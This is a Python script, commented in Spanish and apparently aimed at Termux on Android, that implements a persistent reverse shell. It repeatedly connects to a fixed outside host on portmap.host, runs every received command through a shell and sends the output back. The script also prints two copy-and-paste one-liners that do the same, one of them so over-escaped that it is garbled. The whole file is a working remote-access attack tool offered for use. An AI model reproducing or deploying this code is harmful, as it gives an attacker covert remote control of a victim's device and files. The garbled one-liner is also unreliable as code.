#!/usr/bin/env python3
"""
REVERSE SHELL ULTRA ESTABLE - NO SE CIERRA NUNCA
"""

import socket
import subprocess
import os
import sys
import time
import platform

# ===== CONFIGURACIÓN =====
HOST = "Astrazam-37147.portmap.host"
PORT = 37147
# =========================

def ultra_stable_shell():
    """Shell ultra estable que no se cierra nunca"""
    print(f"[+] Conectando a {HOST}:{PORT}")
    print("[+] Shell ultra estable activada - No se cerrará")
    
    while True:
        try:
            # Crear conexión
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((HOST, PORT))
            s.settimeout(3600)  # 1 hora de timeout para recv
            
            print(f"[+] Conexión #{time.strftime('%H:%M:%S')}")
            
            # Enviar banner
            banner = f"""
{'='*60}
🚀 REVERSE SHELL ULTRA ESTABLE - TERMUX
{'='*60}
Host: {platform.node()}
User: {os.getenv('USER', 'termux')}
Hora: {time.strftime('%H:%M:%S')}
Directorio: {os.getcwd()}
{'='*60}
[+] COMANDOS DISPONIBLES:
    • cd, ls, pwd, cat, nano, mv, cp, rm
    • cd ~/storage       # Almacenamiento interno
    • cd ~/storage/shared # Archivos compartidos
    • ls -la            # Ver con detalles
    • termux-setup-storage # Configurar almacenamiento
{'='*60}
[+] IMPORTANTE: Esta shell NO se cerrará automáticamente
    Solo se cerrará si escribes 'exit' o 'quit'
{'='*60}

termux@shell:~$ """
            s.sendall(banner.encode())
            
            # Variable para el directorio actual
            current_dir = os.getcwd()
            
            # Bucle principal de comandos
            while True:
                try:
                    # Recibir comando
                    s.sendall(b"\ntermux@shell:~$ ")
                    data = s.recv(4096).decode().strip()
                    
                    if not data:
                        # Conexión cerrada por el otro lado
                        print("[-] Conexión cerrada remotamente")
                        break
                    
                    # Comandos especiales
                    if data.lower() in ["exit", "quit"]:
                        s.sendall(b"\n[+] Saliendo de la shell...\n")
                        s.close()
                        return
                    
                    # Manejar CD correctamente
                    if data.startswith("cd "):
                        path = data[3:].strip()
                        
                        # Corregir el error común
                        if path.startswith("--/"):
                            path = path.replace("--/", "~/")
                        
                        # Expandir ~ a home
                        if path.startswith("~/"):
                            home = os.path.expanduser("~")
                            path = path.replace("~", home, 1)
                        elif path == "~":
                            path = os.path.expanduser("~")
                        
                        try:
                            os.chdir(path)
                            current_dir = os.getcwd()
                            s.sendall(f"[+] Directorio cambiado a: {current_dir}\n".encode())
                        except FileNotFoundError:
                            s.sendall(f"[-] Error: Directorio no encontrado: {path}\n".encode())
                        except PermissionError:
                            s.sendall(f"[-] Error: Permiso denegado para: {path}\n".encode())
                        except Exception as e:
                            s.sendall(f"[-] Error: {str(e)}\n".encode())
                        continue
                    
                    # Comando PWD
                    if data == "pwd":
                        s.sendall(f"{current_dir}\n".encode())
                        continue
                    
                    # Para cualquier otro comando
                    try:
                        # Ejecutar con timeout
                        proc = subprocess.run(
                            data,
                            shell=True,
                            cwd=current_dir,
                            capture_output=True,
                            text=True,
                            timeout=30
                        )
                        
                        # Enviar output
                        if proc.stdout:
                            s.sendall(proc.stdout.encode())
                        if proc.stderr:
                            s.sendall(proc.stderr.encode())
                            
                    except subprocess.TimeoutExpired:
                        s.sendall(b"\n[!] Timeout: Comando tardando más de 30 segundos\n")
                    except Exception as e:
                        s.sendall(f"[-] Error ejecutando comando: {str(e)}\n".encode())
                    
                except socket.timeout:
                    # Enviar ping para mantener conexión activa
                    s.sendall(b"\n[ping] Conexion activa - Esperando comandos...\n")
                    continue
                except Exception as e:
                    s.sendall(f"\n[!] Error interno: {str(e)}\n".encode())
                    break
            
            # Cerrar socket y reconectar
            s.close()
            print(f"[-] Reconectando en 3 segundos...")
            time.sleep(3)
            
        except KeyboardInterrupt:
            print("\n[+] Interrumpido por usuario")
            sys.exit(0)
        except ConnectionRefusedError:
            print("[-] Conexión rechazada - Verifica portmap.io")
            time.sleep(5)
        except socket.timeout:
            print("[-] Timeout de conexión - Reintentando...")
            time.sleep(3)
        except Exception as e:
            print(f"[-] Error: {e} - Reconectando en 5s...")
            time.sleep(5)

# ===== ONE-LINER ULTRA SIMPLE =====
ONE_LINER = '''python3 -c "import socket,subprocess,os,time;h='Astrazam-37147.portmap.host';p=37147;print('[*] Conectando a portmap.io');exec('while 1: try: s=__import__(\\'socket\\').socket();s.connect((h,p));s.send(b\\\\\\\\\\\\\\\"\\\\\\\\n[+] Shell ultra estable\\\\\\\\n$ \\\\\\\\\\\\\\\");cwd=os.getcwd();exec(\\'while 1: try: s.send(b\\\\\\\\\\\\\\\"$ \\\\\\\\\\\\\\\");d=s.recv(4096).decode();exec(\\\\\\\"if not d:break\\\\\\\");exec(\\\\\\\"if d.strip() in [\\\\\\\\\\\\\\\'exit\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'quit\\\\\\\\\\\\\\\']:s.send(b\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n[+] Saliendo\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\");break\\\\\\\");exec(\\\\\\\"if d.startswith(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'cd \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'):p=d[3:];exec(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"try:os.chdir(p);cwd=os.getcwd();s.send(f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"[+] cd: {cwd}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\".encode())except Exception as e:s.send(f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"[-] cd error: {str(e)}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\".encode())\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\");continue\\\\\\\");exec(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"try:r=__import__(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'subprocess\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\').run(d,shell=True,cwd=cwd,capture_output=True,timeout=30);s.send(r.stdout);s.send(r.stderr)except Exception as e:s.send(f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"[-] Error: {str(e)}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\".encode())\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\");\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\") except: s.send(b\\\\\\\\\\\\\\\"[ping] alive\\\\\\\\\\\\\\\");continue\\\');s.close() except Exception as e: print(f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"[-] Error: {e}\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"); time.sleep(3)')"'''

if __name__ == "__main__":
    # Mostrar opciones
    print(f"""
{'='*60}
🔥 REVERSE SHELL ULTRA ESTABLE
{'='*60}
1. Ejecutar shell completa
2. Ver one-liner para copiar
3. Versión simple (recomendada)
{'='*60}
""")
    
    try:
        opcion = input("Selecciona (1/2/3): ").strip()
        
        if opcion == "1":
            ultra_stable_shell()
        elif opcion == "2":
            print("\n📋 ONE-LINER ULTRA ESTABLE:")
            print("-" * 60)
            print(ONE_LINER)
            print("-" * 60)
            print("\nCopia y pega en Termux")
        elif opcion == "3":
            # Versión simple y robusta
            simple_script = '''python3 -c "
import socket,subprocess,os,time
host='Astrazam-37147.portmap.host'
port=37147
print('[+] Conectando...')
while True:
    try:
        s=socket.socket()
        s.connect((host,port))
        s.send(b'\\\\n[+] Shell lista - Escribe comandos:\\\\n')
        cwd=os.getcwd()
        while True:
            try:
                s.send(b'$ ')
                cmd=s.recv(4096).decode().strip()
                if not cmd: break
                if cmd in ['exit','quit']: break
                if cmd.startswith('cd '):
                    path=cmd[3:]
                    try:
                        os.chdir(path)
                        cwd=os.getcwd()
                        s.send(f'[+] cd: {cwd}\\\\n'.encode())
                    except Exception as e:
                        s.send(f'[-] cd error: {str(e)}\\\\n'.encode())
                    continue
                try:
                    r=subprocess.run(cmd,shell=True,cwd=cwd,capture_output=True,timeout=30)
                    if r.stdout: s.send(r.stdout)
                    if r.stderr: s.send(r.stderr)
                except Exception as e:
                    s.send(f'[-] Error: {str(e)}\\\\n'.encode())
            except:
                s.send(b'[ping] alive\\\\n')
                continue
        s.close()
        time.sleep(3)
    except:
        time.sleep(5)
        continue
"'''
            print("\n📋 VERSIÓN SIMPLE RECOMENDADA:")
            print("-" * 60)
            print(simple_script)
            print("-" * 60)
            print("\nCopia y pega en Termux")
        else:
            print("[!] Opción inválida, ejecutando shell completa...")
            ultra_stable_shell()
            
    except KeyboardInterrupt:
        print("\n[+] Saliendo...")
        sys.exit(0)
